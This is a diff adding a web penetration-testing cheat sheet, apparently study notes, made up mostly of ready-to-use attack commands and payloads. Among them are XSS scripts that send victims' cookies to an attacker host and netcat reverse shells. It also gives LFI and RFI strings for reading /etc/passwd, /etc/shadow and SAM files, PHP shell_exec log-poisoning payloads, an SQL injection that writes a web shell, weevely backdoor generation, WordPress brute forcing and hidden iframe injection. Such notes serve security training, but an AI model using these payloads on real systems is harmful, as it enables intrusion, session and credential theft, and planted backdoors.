@@ -1,0 +1,204 @@
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+ALWAYS READ THE SOURCE CODE OF A WEBSITE LOOK FOR COMMENTS <!-- comments -->
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Check Javascript .js for username/passwords
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+-------------------- HTTP Enumeration --------------------
+Search for folders with gobuster:
+     # gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip
+     # gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
+     # gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
+Dirb - Directory brute force finding using a dictionary file
+     # dirb http://$ip/ wordlist.dict dirb <http://vm/>
+Dirb against a proxy
+     # dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129
+Get Options available from web server 
+     # curl -vX OPTIONS vm/test
+Uniscan directory finder:
+     # uniscan -qweds -u <http://vm/>   
+
+-------------------- Nikto --------------------
+Nikto Basic
+     nikto -h $ip
+Proxy Enumeration (useful for open proxies)
+     # nikto -useproxy http://$ip:3128 -h $ip
+   
+-------------------- Web Shag --------------------   
+Web Shag Web Application Vulnerability Assessment Platform
+     # webshag-gui
+
+-------------------- RSH Enumeration --------------------
+RSH Enumeration - Unencrypted file transfer system
+     # auxiliary/scanner/rservices/rsh_login
+
+-------------------- TLS & SSL --------------------
+TLS & SSL Testing
+     # ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha > OUTPUT-FILE.html
+     
+-------------------- Finger --------------------
+Finger Enumeration
+finger @$ip
+finger batman@$ip
+
+-------------------- NMAP --------------------
+HTTP Enumeration with NMAP
+     # nmap --script=http-enum -p80 -n $ip/24
+Nmap Check the server methods
+     # nmap --script http-methods --script-args http-methods.url-path='/test' $ip
+     
+---------------- HTTP PUT ----------------
+HTTP Put
+nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
+
+-------------------- Fuzzing --------------------
+Wfuzz - The web brute forcer
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test 
+wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ 
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"
+
+-------------------- Extract link from webpage --------------------
+cat index.html | grep "href=" | cut -d "/" -f3| grep "<[DOMAIN]>" | cut -d '"' -f1 | sort -u
+
+-------------------- Web Shells --------------------
+http://tools.kali.org/maintaining-access/webshells
+     # ls -l /usr/share/webshells/
+
+-------------------- PHP backdoor --------------------
+Generate a PHP backdoor (generate) protected with the given password (s3cr3t)
+     # weevely generate s3cr3t
+     # weevely http://$ip/weevely.php s3cr3t
+
+-------------------- Wordpress --------------------
+WordPress Scan - Wordpress security scanner
+     # wpscan --url $ip/blog --proxy $ip:3129
+     # wpscan --url http://<IP ADDRESS>/wp/ -e vt,tt,u,ap --log wp.log
+WPScan brute force known user account.
+     # wpscan -u <IP ADDRESS> --wordlist <wordlist>.txt --username <UserName> --threads 50
+
+xmlrpc.php
+https://null-byte.wonderhowto.com/how-to/gain-control-wordpress-by-exploiting-xml-rpc-0174864/
+
+/wordpress-xmlrpc-brute-v2.py http://<IPADDRESS>/wp/xmlrpc.php /usr/share/wordlists/rockyou.txt admin
+
+-------------------- XSS --------------------
+On attacker machine set listener 
+     # nc -nlvp <[PORT]>
+On victim website 
+     <script>new Image().src="http://<[IP]>:<[PORT]>/test.php?output="+document.cookie;</script>
+
+-------------------- LFI/RFI --------------------
+Connect via netcat to victim 
+     # nc -nv <[IP]> <[PORT]>) 
+     # nc -nv <[IP]> <[PORT]> -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
+     
+LFI Through Curl
+     curl -X POST –k https://<IP ADDRESS>:<PORT>/file.php -d "file=../../../../../etc/passwd"
+     
+Fimap - There is a Python tool called fimap which can be leveraged to automate the exploitation of LFI/RFI vulnerabilities that are found in PHP (sqlmap for LFI):
+     https://github.com/kurobeats/fimap    
+          Gaining a shell from phpinfo()
+          fimap + phpinfo() Exploit - If a phpinfo() file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster.
+ 
+For Local File Inclusions look for the include() function in PHP code.
+     include("lang/".$_COOKIE['lang']);
+     include($_GET['page'].".php");
+
+LFI - Encode and Decode a file using base64
+     # curl -s http://$ip/?page=php://filter/convert.base64-encode/resource=index | grep -e '[^\ ]\{40,\}' | base64 -d
+
+LFI - Download file with base 64 encoding
+     http://$ip/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+LFI Linux Files:
+     /etc/issue
+     /proc/version
+     /etc/profile
+     /etc/passwd
+     /etc/passwd
+     /etc/shadow
+     /root/.bash_history
+     /var/log/dmessage
+     /var/mail/root
+     /var/spool/cron/crontabs/root
+
+LFI Windows Files:
+     %SYSTEMROOT%\repair\system
+     %SYSTEMROOT%\repair\SAM
+     %SYSTEMROOT%\repair\SAM
+     %WINDIR%\win.ini
+     %SYSTEMDRIVE%\boot.ini
+     %WINDIR%\Panther\sysprep.inf
+     %WINDIR%\system32\config\AppEvent.Evt
+
+LFI OSX Files:
+     /etc/fstab
+     /etc/master.passwd
+     /etc/resolv.conf
+     /etc/sudoers
+     /etc/sysctl.conf
+
+LFI - Download passwords file
+     http://$ip/index.php?page=/etc/passwd
+     http://$ip/index.php?file=../../../../etc/passwd
+     
+LFI - Download passwords file with filter evasion
+http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+Local File Inclusion - In versions of PHP below 5.3 we can terminate with null byte
+     GET /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00
+
+Contaminating Log Files 
+     <?php echo shell_exec($_GET['cmd']);?>
+
+For a Remote File Inclusion look for php code that is not sanitized and passed to the PHP include function and the php.ini file must be configured to allow remote files /etc/php5/cgi/php.ini - “allow_url_fopen” and “allow_url_include both set to “on”
+     include($_REQUEST["file"].".php");
+
+Remote File Inclusion
+     http://$ip/addguestbook.php?name=a&comment=b&LANG=http://$localip/evil.txt
+     <?php echo shell_exec("ipconfig");?>     
+     
+-------------------- Steganography --------------------
+# apt-get install steghide
+# steghide extract -sf picture.jpg
+# steghide info picture.jpg
+# apt-get install stegosuite
+     
+-------------------- SQL Injection --------------------
+Bse:
+     any' or 1=1 limit 1;-- 
+
+Number of columns:
+     order by 1, order by 2, ...
+
+Expose data from database:
+     UNION select 1,2,3,4,5,6
+
+Enum tables:
+     UNION select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+Shell upload:
+     <[IP]>:<[PORT]>/<[URL]>.php?<[PARAMETER]>=999 union select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4,5,6 into OUTFILE '/var/www/html/evil.php'
+
+-------------------- Cookies --------------------
+Essential Iceweasel Add-ons
+     Cookies Manager 
+          https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/
+     Tamper Data
+          https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
+
+Stealing Cookies and Session Information
+     <script>
+     new image().src="http://$ip/bogus.php?output="+document.cookie;
+     </script>
+     nc -nlvp 80
+
+Browser Redirection and IFRAME Injection
+<iframe SRC="http://$ip/report" height = "0" width ="0"></iframe>
+
+-------------------- Drupal --------------------
+Droopescan
+     Apt-get install python-pip
+     pip install droopsescan
+          droopescan scan drupal -u <IP ADDRESS>
+
